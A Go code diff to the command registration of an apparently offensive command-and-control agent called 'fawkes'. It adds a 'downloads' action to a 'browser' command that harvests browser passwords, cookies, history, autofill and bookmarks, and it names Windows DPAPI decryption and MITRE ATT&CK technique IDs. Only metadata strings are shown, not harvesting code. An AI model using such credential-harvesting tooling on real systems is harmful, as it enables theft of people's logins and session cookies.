@@ -9,9 +9,9 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "browser",
-		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, bookmarks, and Firefox cookies. (T1555.003, T1217)",
-		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks>] [-browser <all|chrome|edge|chromium|firefox>]",
-		Version:             4,
+		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, bookmarks, downloads, and Firefox cookies. (T1555.003, T1217)",
+		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks|downloads>] [-browser <all|chrome|edge|chromium|firefox>]",
+		Version:             5,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1555.003", "T1217"},
@@ -29,8 +29,8 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks"},
-				Description:      "What to harvest: passwords (Windows Chromium only — DPAPI), cookies (Windows Chromium DPAPI; Firefox plaintext on all platforms), history (browsing URLs), autofill (form data), or bookmarks (saved URLs).",
+				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks", "downloads"},
+				Description:      "What to harvest: passwords (Windows Chromium only — DPAPI), cookies (Windows Chromium DPAPI; Firefox plaintext on all platforms), history (browsing URLs), autofill (form data), bookmarks (saved URLs), or downloads (download history).",
 				DefaultValue:     "history",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
